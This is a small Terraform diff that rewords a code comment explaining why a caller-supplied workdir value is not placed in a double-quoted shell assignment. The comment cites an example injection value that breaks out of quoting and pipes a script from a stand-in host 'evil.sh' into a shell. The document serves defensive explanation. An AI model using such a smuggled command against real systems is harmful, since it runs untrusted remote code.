@@ -213,11 +213,10 @@ locals {
 
   # Kept as an *override only* (empty string means "no override"), rather
   # than pre-resolving the "$HOME"-based default here as a Terraform string --
-  # see the identical comment on install_prefix_override in the "happy"
-  # module's main.tf for why: this needs the literal "$HOME" in
-  # ARG_WORKDIR_OVERRIDE to expand at shell runtime, but workdir is also a
-  # caller-supplied string, and a double-quoted assignment would let a value
-  # like `foo"; curl evil.sh | sh #` break out and execute.
+  # this needs the literal "$HOME" in ARG_WORKDIR_OVERRIDE to expand at shell
+  # runtime, but workdir is also a caller-supplied string, and a
+  # double-quoted assignment would let a value like
+  # `foo"; curl evil.sh | sh #` break out and execute.
   workdir_override = var.workdir != null ? var.workdir : ""
 
   session_env = var.session_name != null ? var.session_name : ""
